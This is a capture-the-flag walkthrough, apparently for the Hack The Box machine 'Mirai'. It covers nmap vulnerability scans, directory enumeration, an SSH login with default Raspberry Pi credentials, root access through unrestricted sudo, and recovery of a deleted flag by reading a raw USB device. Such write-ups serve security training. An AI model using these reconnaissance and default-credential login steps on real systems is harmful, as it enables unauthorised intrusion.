# Mirai Walkthrough

![mirai](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Mirai/mirai.png)

## Let's first fast scan our machine using nmap this is our initial scan

```
sudo nmap -F -sV 10.10.10.48
```

### Result

```
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0) 
53/tcp open  domain  dnsmasq 2.76 
80/tcp open  http    lighttpd 1.4.35 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

##  We got 3 port open let's do a berif scan i.e, our final scan

```
sudo nmap -A -O -v --script vuln 10.10.10.48
```

### Result

```
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0) 
| vulners:  
|   cpe:/a:openbsd:openssh:6.7p1:  
|       CVE-2015-5600   8.5     https://vulners.com/cve/CVE-2015-5600 
|       MSF:ILITIES/GENTOO-LINUX-CVE-2015-6564/ 6.9     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2015-6564/
*EXPLOIT* 
|       CVE-2015-6564   6.9     https://vulners.com/cve/CVE-2015-6564 
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919 
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906 
|       SSV:90447       4.6     https://vulners.com/seebug/SSV:90447    *EXPLOIT* 
|       CVE-2016-0778   4.6     https://vulners.com/cve/CVE-2016-0778 
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/     4.3     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2020-14145/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP9-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/ *
EXPLOIT* 
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145 
|       CVE-2015-5352   4.3     https://vulners.com/cve/CVE-2015-5352 
|       MSF:ILITIES/UBUNTU-CVE-2016-0777/       4.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2016-0777/     *
EXPLOIT* 
|       MSF:ILITIES/IBM-AIX-CVE-2016-0777/      4.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2016-0777/    *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2016-0777/       4.0     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2016-0777/     *
EXPLOIT* 
|       MSF:ILITIES/AIX-7.2-OPENSSH_ADVISORY7_CVE-2016-0777/    4.0     https://vulners.com/metasploit/MSF:ILITIES/AIX-7.2-OPE
NSSH_ADVISORY7_CVE-2016-0777/   *EXPLOIT* 
|       MSF:ILITIES/AIX-7.1-OPENSSH_ADVISORY7_CVE-2016-0777/    4.0     https://vulners.com/metasploit/MSF:ILITIES/AIX-7.1-OPE
NSSH_ADVISORY7_CVE-2016-0777/   *EXPLOIT* 
|       MSF:ILITIES/AIX-5.3-OPENSSH_ADVISORY7_CVE-2016-0777/    4.0     https://vulners.com/metasploit/MSF:ILITIES/AIX-5.3-OPE
NSSH_ADVISORY7_CVE-2016-0777/   *EXPLOIT* 
|       CVE-2016-0777   4.0     https://vulners.com/cve/CVE-2016-0777 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2015-6563/ 1.9     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2015-6563/
*EXPLOIT* 
|_      CVE-2015-6563   1.9     https://vulners.com/cve/CVE-2015-6563 
53/tcp open  domain  dnsmasq 2.76 
| vulners:  
|   cpe:/a:thekelleys:dnsmasq:2.76:  
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A
*EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-25682/      8.3     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2020-25682/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-25681/      8.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-25681/     *EXPLOIT* 
|       MSF:ILITIES/FREEBSD-CVE-2020-25681/     8.3     https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2020-25681/   *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2020-25682/        8.3     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
20-25682/       *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2020-25681/        8.3     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
20-25681/       *EXPLOIT* 
|       CVE-2020-25682  8.3     https://vulners.com/cve/CVE-2020-25682 
|       CVE-2020-25681  8.3     https://vulners.com/cve/CVE-2020-25681 
|       SSV:96623       7.8     https://vulners.com/seebug/SSV:96623    *EXPLOIT* 
|       EXPLOITPACK:708148DF89AFEA44750A9B84E292A6B9    7.8     https://vulners.com/exploitpack/EXPLOITPACK:708148DF89AFEA4475
0A9B84E292A6B9  *EXPLOIT* 
|       EDB-ID:42946    7.8     https://vulners.com/exploitdb/EDB-ID:42946      *EXPLOIT* 
|       CVE-2017-14496  7.8     https://vulners.com/cve/CVE-2017-14496 
|       1337DAY-ID-28727        7.8     https://vulners.com/zdt/1337DAY-ID-28727        *EXPLOIT* 
|       SSV:96620       7.5     https://vulners.com/seebug/SSV:96620    *EXPLOIT* 
|       SSV:96619       7.5     https://vulners.com/seebug/SSV:96619    *EXPLOIT* 
|       SSV:96618       7.5     https://vulners.com/seebug/SSV:96618    *EXPLOIT* 
|       EXPLOITPACK:E661AED6AF5BCC1565D1CB0F9878E40B    7.5     https://vulners.com/exploitpack/EXPLOITPACK:E661AED6AF5BCC1565
D1CB0F9878E40B  *EXPLOIT* 
|       EXPLOITPACK:95340EB39AF331E01096F2B1CF7F1DE2    7.5     https://vulners.com/exploitpack/EXPLOITPACK:95340EB39AF331E010
96F2B1CF7F1DE2  *EXPLOIT* 
|       EXPLOITPACK:572F56450B83EECCA41D07EF1B33B48B    7.5     https://vulners.com/exploitpack/EXPLOITPACK:572F56450B83EECCA4
1D07EF1B33B48B  *EXPLOIT* 
|       EDB-ID:42943    7.5     https://vulners.com/exploitdb/EDB-ID:42943      *EXPLOIT* 
|       EDB-ID:42942    7.5     https://vulners.com/exploitdb/EDB-ID:42942      *EXPLOIT* 
|       EDB-ID:42941    7.5     https://vulners.com/exploitdb/EDB-ID:42941      *EXPLOIT* 
|       CVE-2017-14493  7.5     https://vulners.com/cve/CVE-2017-14493 
|       CVE-2017-14492  7.5     https://vulners.com/cve/CVE-2017-14492 
|       CVE-2017-14491  7.5     https://vulners.com/cve/CVE-2017-14491 
|       1337DAY-ID-28724        7.5     https://vulners.com/zdt/1337DAY-ID-28724        *EXPLOIT* 
|       1337DAY-ID-28723        7.5     https://vulners.com/zdt/1337DAY-ID-28723        *EXPLOIT* 
|       1337DAY-ID-28720        7.5     https://vulners.com/zdt/1337DAY-ID-28720        *EXPLOIT* 
|       MSF:ILITIES/FREEBSD-CVE-2020-25687/     7.1     https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2020-25687/   *
EXPLOIT* 
|       MSF:ILITIES/FREEBSD-CVE-2020-25683/     7.1     https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2020-25683/   *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2020-25683/        7.1     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
20-25683/       *EXPLOIT* 
|       CVE-2020-25687  7.1     https://vulners.com/cve/CVE-2020-25687 
|       CVE-2020-25683  7.1     https://vulners.com/cve/CVE-2020-25683 
|       SSV:96622       5.0     https://vulners.com/seebug/SSV:96622    *EXPLOIT* 
|       EXPLOITPACK:C0456C7DF1625677A211CB9799B79F9A    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C0456C7DF1625677A2
11CB9799B79F9A  *EXPLOIT* 
|       EDB-ID:42945    5.0     https://vulners.com/exploitdb/EDB-ID:42945      *EXPLOIT* 
|       CVE-2019-14513  5.0     https://vulners.com/cve/CVE-2019-14513 
|       CVE-2017-15107  5.0     https://vulners.com/cve/CVE-2017-15107 
|       CVE-2017-14495  5.0     https://vulners.com/cve/CVE-2017-14495 
|       CVE-2017-13704  5.0     https://vulners.com/cve/CVE-2017-13704 
|       1337DAY-ID-28726        5.0     https://vulners.com/zdt/1337DAY-ID-28726        *EXPLOIT* 
|       SSV:96621       4.3     https://vulners.com/seebug/SSV:96621    *EXPLOIT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2020-25686/        4.3     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-20
20-25686/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE_LINUX-CVE-2020-25686/        4.3     https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-20
20-25686/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE_LINUX-CVE-2020-25685/        4.3     https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-20
20-25685/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE_LINUX-CVE-2020-25684/        4.3     https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-20
20-25684/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-25686/      4.3     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2020-25686/     *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-25684/      4.3     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2020-25684/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-25686/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-25686/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-25685/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-25685/     *EXPLOIT* 
|       MSF:ILITIES/GENTOO-LINUX-CVE-2021-3448/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2021-3448/
*EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2020-25686/        4.3     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
20-25686/       *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2020-25685/        4.3     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
20-25685/       *EXPLOIT* 
|       EXPLOITPACK:22D470FAFA79A3DB978CC3F8766CC759    4.3     https://vulners.com/exploitpack/EXPLOITPACK:22D470FAFA79A3DB97
8CC3F8766CC759  *EXPLOIT* 
|       EDB-ID:42944    4.3     https://vulners.com/exploitdb/EDB-ID:42944      *EXPLOIT* 
|       CVE-2021-3448   4.3     https://vulners.com/cve/CVE-2021-3448 
|       CVE-2020-25686  4.3     https://vulners.com/cve/CVE-2020-25686 
|       CVE-2020-25685  4.3     https://vulners.com/cve/CVE-2020-25685 
|       CVE-2020-25684  4.3     https://vulners.com/cve/CVE-2020-25684 
|       CVE-2019-14834  4.3     https://vulners.com/cve/CVE-2019-14834 
|       CVE-2017-14494  4.3     https://vulners.com/cve/CVE-2017-14494 
|       CBF3EF2D-3A5B-5110-A374-4A5ADE9AC91A    4.3     https://vulners.com/githubexploit/CBF3EF2D-3A5B-5110-A374-4A5ADE9AC91A
*EXPLOIT* 
|       1337DAY-ID-28725        4.3     https://vulners.com/zdt/1337DAY-ID-28725        *EXPLOIT* 
|       PACKETSTORM:144480      0.0     https://vulners.com/packetstorm/PACKETSTORM:144480      *EXPLOIT* 
|       PACKETSTORM:144479      0.0     https://vulners.com/packetstorm/PACKETSTORM:144479      *EXPLOIT* 
|       PACKETSTORM:144473      0.0     https://vulners.com/packetstorm/PACKETSTORM:144473      *EXPLOIT* 
|       PACKETSTORM:144471      0.0     https://vulners.com/packetstorm/PACKETSTORM:144471      *EXPLOIT* 
|       PACKETSTORM:144468      0.0     https://vulners.com/packetstorm/PACKETSTORM:144468      *EXPLOIT* 
|_      PACKETSTORM:144462      0.0     https://vulners.com/packetstorm/PACKETSTORM:144462      *EXPLOIT* 
80/tcp open  http    lighttpd 1.4.35 
| vulners:  
|   cpe:/a:lighttpd:lighttpd:1.4.35:  
|       CVE-2019-11072  7.5     https://vulners.com/cve/CVE-2019-11072 
|       CVE-2014-2323   7.5     https://vulners.com/cve/CVE-2014-2323 
|       CVE-2018-19052  5.0     https://vulners.com/cve/CVE-2018-19052 
|       CVE-2015-3200   5.0     https://vulners.com/cve/CVE-2015-3200 
|_      CVE-2014-2324   5.0     https://vulners.com/cve/CVE-2014-2324 
|_http-server-header: lighttpd/1.4.35 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 4.8 (95%), Linux 4.4
 (95%), Linux 4.9 (95%), Linux 3.18 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%) 
No exact OS matches for host (test conditions non-ideal). 
Uptime guess: 201.257 days (since Sun Sep 19 03:27:14 2021) 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=262 (Good luck!) 
IP ID Sequence Generation: All zeros 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
 
TRACEROUTE (using port 23/tcp) 
HOP RTT       ADDRESS 
1   287.88 ms 10.10.14.1 
2   283.66 ms 10.10.10.48
```

## let's access port 80 we find a blank page let's run dirbuster.

```
dirb http://10.10.10.48
```

### Result

```
==> DIRECTORY: http://10.10.10.48/admin/
```

## got admin directory after accessing we got a a pi hole page

![admin](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Mirai/admin.png)

## on left hand side we got a login page after spending lot of time got nothing. after this i search for default ssh resberrypi credentials using google .

![ssh](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Mirai/ssh.png)

## let's try to login to ssh using this user and password.

# BOOOMMM!! WE GOT SSH PI USER LOGIN .

## let's use sudo -l

### Result

```
Matching Defaults entries for pi on localhost: 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin 
 
User pi may run the following commands on localhost: 
    (ALL : ALL) ALL 
    (ALL) NOPASSWD: ALL
```

## That's easy to gain root use below command for root.

```
sudo su
```

## We Got ROOT

## When we try to access root.txt we got this msg

```
root@raspberrypi:/home/pi# cat /root/root.txt 
I lost my original root.txt! I think I may have a backup on my USB stick...
```

## Let's check if it is mounted by following command df


### Result

```
root@raspberrypi:~# df 
Filesystem     1K-blocks    Used Available Use% Mounted on 
aufs             8856504 2833404   5550168  34% / 
tmpfs             102396    4868     97528   5% /run 
/dev/sda1        1354528 1354528         0 100% /lib/live/mount/persistence/sda1 
/dev/loop0       1267456 1267456         0 100% /lib/live/mount/rootfs/filesystem.squashfs 
tmpfs             255988       0    255988   0% /lib/live/mount/overlay 
/dev/sda2        8856504 2833404   5550168  34% /lib/live/mount/persistence/sda2 
devtmpfs           10240       0     10240   0% /dev 
tmpfs             255988       8    255980   1% /dev/shm 
tmpfs               5120       4      5116   1% /run/lock 
tmpfs             255988       0    255988   0% /sys/fs/cgroup 
tmpfs             255988       8    255980   1% /tmp 
/dev/sdb            8887      93      8078   2% /media/usbstick 
tmpfs              51200       0     51200   0% /run/user/999 
tmpfs              51200       0     51200   0% /run/user/1000
```

## we found /media/usbstick let's check what inside in this directory 

## we found a file name damnit.txt and a directory name lost+found but this directory is empty. let read the content of damnit.txt file.

```
Damnit! Sorry man I accidentally deleted your files off the USB stick. 
Do you know if there is any way to get them back? 
 
-James
```

## we found they delete root.txt file . now we need to recover that file. we search on google and find some hint for recovering that file.

## Go to root directory and then run 

```
fdisk -l
```

## we got /dev/sdb not run below command

```
cat /dev/sdb
```

# BOOOMMMM!!!! WE GOT ROOT HASH

![funny](https://c.tenor.com/D6Qzqk8z-DMAAAAC/minion-funny.gif)
